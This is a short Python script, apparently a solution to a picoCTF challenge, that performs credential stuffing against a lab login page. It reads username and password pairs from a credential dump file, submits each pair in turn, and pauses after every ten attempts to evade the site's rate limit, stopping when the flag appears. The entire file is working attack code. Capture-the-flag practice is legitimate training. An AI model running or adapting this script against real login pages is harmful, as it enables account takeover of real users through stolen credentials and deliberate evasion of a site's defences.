#!/usr/bin/env python3
import time
import requests

URL = "http://candy-mountain.picoctf.net:54131/login"
HOME = "http://candy-mountain.picoctf.net:54131/"
DUMP = "creds-dump.txt"

def load_creds(path):
    creds = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ";" not in line:
                continue
            u, p = line.split(";", 1)
            creds.append((u.strip(), p.strip()))
    return creds

def try_login(session, username, password):
    r = session.post(URL, data={"username": username, "password": password}, allow_redirects=True)
    text = r.text
    if "Invalid username or password" not in text and "Rate Limited Exceeded" not in text:
        home = session.get(HOME)
        if "picoCTF{" in home.text:
            return "flag", home.text
        return "maybe", text + "\n" + home.text
    if "Rate Limited Exceeded" in text:
        return "limited", text
    return "bad", text

def extract_flag(text):
    start = text.find("picoCTF{")
    if start == -1:
        return None
    end = text.find("}", start)
    if end == -1:
        return None
    return text[start:end+1]

creds = load_creds(DUMP)
print(f"[+] Loaded {len(creds)} credentials")

s = requests.Session()
attempts_in_epoch = 0

for i, (u, p) in enumerate(creds, 1):
    if attempts_in_epoch == 10:
        print("[*] Sleeping 31 seconds to reset epoch")
        time.sleep(31)
        attempts_in_epoch = 0

    print(f"[{i}/{len(creds)}] Trying {u}:{p}")
    status, text = try_login(s, u, p)
    attempts_in_epoch += 1

    if status == "flag":
        flag = extract_flag(text)
        print("[+] FLAG FOUND")
        print(flag if flag else text)
        break

    if status == "maybe":
        flag = extract_flag(text)
        print("[+] Possible hit")
        print(flag if flag else text)
        break

    if status == "limited":
        print("[!] Hit rate limit early, sleeping 31 seconds")
        time.sleep(31)
        attempts_in_epoch = 0
